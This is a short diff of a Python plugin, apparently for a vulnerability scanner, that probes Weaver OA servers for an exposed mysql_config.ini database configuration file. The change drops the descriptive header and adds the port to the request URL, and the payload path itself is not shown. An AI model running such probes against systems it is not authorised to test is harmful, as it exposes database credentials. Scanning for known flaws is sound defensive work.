@@ -1,11 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-'''
-name: 泛微OA 数据库配置泄露
-referer: http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-087500
-author: Lucifer
-description: mysql_config.ini泄露。
-'''
+
 import urllib
 import requests
 import logging
@@ -42,7 +37,7 @@ def medusa(Url,RandomAgent,ProxyIp):
     global resp
     global resp2
     try:
-        payload_url = scheme+"://"+url+payload
+        payload_url = scheme+"://"+url+ ':' + str(port)+payload
         headers = {
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
